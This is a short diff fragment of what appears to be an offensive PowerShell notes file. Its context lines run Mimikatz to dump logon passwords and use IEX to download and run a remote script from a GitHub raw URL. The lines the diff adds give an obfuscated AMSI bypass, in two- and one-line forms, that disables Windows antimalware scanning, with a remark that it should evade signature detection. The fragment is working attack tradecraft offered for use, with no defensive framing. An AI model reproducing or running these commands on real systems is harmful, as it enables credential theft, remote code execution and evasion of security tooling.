@@ -36,3 +36,21 @@ Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'
 
 If things go well well come to this
 IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/run.txt')
+
+
+
+
+
+
+
+$m=[ref].assembly.DefinedTypes|?{$_.name -like "*Iu*i*s"}|%{$_.getfields('no'+'NP'+'ubl'+'ic,st'+'At'+'i'+'c')}|?{$_.name -like "*fa*l*d"};
+ 
+ 
+then
+ 
+$m.setvalue(0,$true)
+ 
+ 
+If you have no option but to run it as a one-liner, you can try this - it's unique to us, so should still evade signature detection once the original gets burnt:
+ 
+$m=[ref].assembly.DefinedTypes|?{$_.name -like "*Iu*i*s"}|%{$_.getfields('no'+'NP'+'ubl'+'ic,st'+'At'+'i'+'c')}|?{$_.name -like "*fa*l*d"}|%{$_.setvalue(0,$true)}
